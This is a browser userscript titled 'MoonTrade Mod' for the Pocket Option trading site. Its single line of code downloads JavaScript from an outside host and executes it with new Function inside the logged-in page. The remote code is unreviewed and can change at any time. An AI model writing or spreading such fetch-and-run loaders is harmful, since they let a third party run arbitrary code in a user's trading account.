// ==UserScript==
// @name         MoonTrade Mod
// @version      3.4
// @description  MoonTrade Mod для Pocket Option. Завантажує актуальну версію моду, оновлюється сам.
// @match        https://pocketoption.com/*
// @match        https://*.pocketoption.com/*
// @run-at       document-end
// @inject-into  page
// @noframes
// ==/UserScript==

fetch('https://learn.moontrade.community/mod/moontrade.js',{cache:'no-store'}).then(r=>r.text()).then(js=>{new Function(js)();});
